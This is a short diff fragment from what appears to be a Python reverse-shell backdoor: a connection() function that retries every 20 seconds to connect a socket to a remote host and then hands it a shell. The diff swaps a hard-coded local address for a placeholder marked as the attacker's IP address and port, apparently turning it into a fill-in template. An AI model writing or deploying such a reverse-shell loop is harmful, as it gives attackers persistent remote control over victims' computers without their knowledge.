@@ -56,7 +56,7 @@ def connection():
 	while True:
 		time.sleep(20)
 		try:
-			sock.connect(("192.168.0.109", 54321))
+			sock.connect(("Here Goes attackr's ipaddress", portnumber))
 			shell()
 		except:
 			connection()
